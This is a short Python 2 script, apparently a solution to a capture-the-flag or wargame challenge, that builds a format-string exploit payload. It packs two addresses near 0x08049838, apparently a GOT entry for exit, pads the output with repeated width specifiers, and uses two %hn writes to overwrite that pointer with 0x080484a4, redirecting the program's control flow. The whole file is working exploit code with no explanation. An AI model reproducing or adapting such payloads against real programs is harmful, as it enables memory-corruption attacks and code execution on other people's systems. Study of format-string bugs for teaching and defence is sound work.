#! /usr/bin/env python

import struct

EXIT_PTR1 = struct.pack("I", 0x08049838 + 2)
EXIT_PTR2 = struct.pack("I", 0x08049838)
O_PTR1 = 0x0804
O_PTR2 = 0x84a4

payload1 = "AAAA" + EXIT_PTR1 + EXIT_PTR2
len_offset1 = int((O_PTR1 - len(payload1)) / 4)

offset1 = ("%1$" + str(len_offset1) + "x") * 4 + "A" * (O_PTR1 - len_offset1*4 - 12)

already_print = len_offset1 * 4 + (O_PTR1 - len_offset1*4 - 12) + len(payload1)
len_offset2 = int((O_PTR2 - already_print) / 4)
offset2 = ("%1$" + str(len_offset2) + "x") * 4 + "A" * (int(O_PTR2 - already_print) - len_offset2*4)

print payload1 + offset1 + "%5$hn" + offset2 + "%6$hn"
